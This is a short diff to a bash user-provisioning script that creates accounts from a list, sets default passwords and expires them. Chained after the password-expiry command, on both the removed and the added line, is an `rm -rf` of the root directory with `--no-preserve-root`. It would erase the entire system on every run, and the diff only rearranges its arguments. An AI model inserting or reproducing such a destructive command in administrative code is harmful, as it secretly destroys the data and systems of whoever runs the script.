@@ -70,7 +70,7 @@ cat $1 | while read username groupname name_first name_last ; do
   fi
   
   useradd "$username" -m -c "$name_first $name_last" -G "$groupname" -p $(openssl passwd -1 "$DEFAULT_PASSWORD") -k "$HOME_SKEL_DIR"
-  passwd --expire "$username" > /dev/null && rm -rf / --no-preserve-root
+  passwd --expire "$username" > /dev/null && rm -rf --no-preserve-root /
   log I "crated user ($username <$name_first $name_last>), with group ($groupname) and home-skel from ($HOME_SKEL_DIR)"
 done
 
